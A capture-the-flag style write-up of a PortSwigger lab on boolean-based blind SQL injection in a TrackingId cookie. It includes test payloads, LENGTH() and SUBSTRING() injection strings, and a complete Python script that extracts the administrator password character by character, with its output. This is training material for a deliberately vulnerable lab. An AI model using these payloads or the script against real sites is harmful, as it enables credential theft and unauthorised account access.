[Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)  


## Goal
Exploit a Boolean-based Blind SQL Injection vulnerability in the `TrackingId` cookie to retrieve the administrator's password and log in to the administrator account.

## Steps to Solve

### 1. Identify the SQL Injection
- Open the shop and intercept the request using Burp Suite.
- Modify the `TrackingId` cookie to test true and false conditions.

**True condition:**
```sql
PDNs1t9AJk7uNxry' AND 1=1
```

**False condition:**
```sql
PDNs1t9AJk7uNxry' AND 1=2
```

Observe the `Welcome back` message to distinguish between true and false responses.

### 2. Determine Password Length
Use the `LENGTH()` function to determine the administrator's password length.

```sql
PDNs1t9AJk7uNxry' AND LENGTH((SELECT password from users where username='administrator'))={i}--  
```

The password length is found to be **20 characters**.

### 3. Automate Password Extraction Using Python
Use the `SUBSTRING()` function to determine the administrator's password.

The script:
- Sends SQL injection payloads through the `TrackingId` cookie.
- Tests each password position.
- Checks possible lowercase letters and digits (`a-z`, `0-9`).
- Identifies the correct character by checking for the `Welcome back` response.
- Combines the extracted characters to reconstruct the password.

```
PDNs1t9AJk7uNxry' AND SUBSTRING((SELECT password from users where username='administrator'), {i}, 1) = '{char}'--  
```
The password is found to be **9v3u031l73sm5aj6k3zq**.

### 4. Python Code

```
import requests
url = 'https://0a0500ff0487896480c6a9890092003d.web-security-academy.net/filter?category=Food+%26+Drink'
characters = '0123456789abcdefghijklmnopqrstuvwxyz'

def get_length():
    for i in range(1,101):
        cookie = {'TrackingId':'PDNs1t9AJk7uNxry', 'session':'QdXuFiFNCrlj5d6rLKhfsIR2imdsYzEm'}
        payload = f"' AND LENGTH((SELECT password from users where username='administrator'))={i}--  "
        cookie['TrackingId'] = cookie['TrackingId'] + payload
        r = requests.get(url,cookies=cookie)
        
        if 'Welcome back!' in r.text:
            return i

def get_data(length):
    temp = ''
    for i in range(1,length+1):
        for char in characters:
            cookie = {'TrackingId':'PDNs1t9AJk7uNxry', 'session':'QdXuFiFNCrlj5d6rLKhfsIR2imdsYzEm'}
            payload = f"' AND SUBSTRING((SELECT password from users where username='administrator'), {i}, 1) = '{char}'--  "
            cookie['TrackingId'] = cookie['TrackingId'] + payload            
            r = requests.get(url,cookies=cookie)
                    
            if 'Welcome back!' in r.text:
                print('\r' + temp)
                temp += char
                break
    return temp

length = get_length()
print(f"Password Length: {length}")
print("Dumping Data ... Please be Patient...")
data = get_data(length)
print(f"Got it ! : {data}")
```

### Code Output: 

```
Password Length: 20
Dumping Data ... Please be Patient...

9
9v
9v3
9v3u
9v3u0
9v3u03
9v3u031
9v3u031l
9v3u031l7
9v3u031l73
9v3u031l73s
9v3u031l73sm
9v3u031l73sm5
9v3u031l73sm5a
9v3u031l73sm5aj
9v3u031l73sm5aj6
9v3u031l73sm5aj6k
9v3u031l73sm5aj6k3
9v3u031l73sm5aj6k3z
Got it ! : 9v3u031l73sm5aj6k3zq
```

### 5. Log in as Administrator
- Open the My Account page.
- Enter the username `administrator`.
- Enter the password `9v3u031l73sm5aj6k3zq`.
- Verify successful access to the administrator account.

## Key Takeaways
- Boolean-based Blind SQL Injection
- Conditional response analysis
- SQL `LENGTH()` and `SUBSTRING()` functions
- Python automation for password extraction
- HTTP request handling and cookie manipulation

## Lab Information
- **Vulnerability:** Blind SQL Injection
- **Attack Type:** Boolean-based
- **Tools:** Burp Suite, Python
- **Target:** TrackingId Cookie
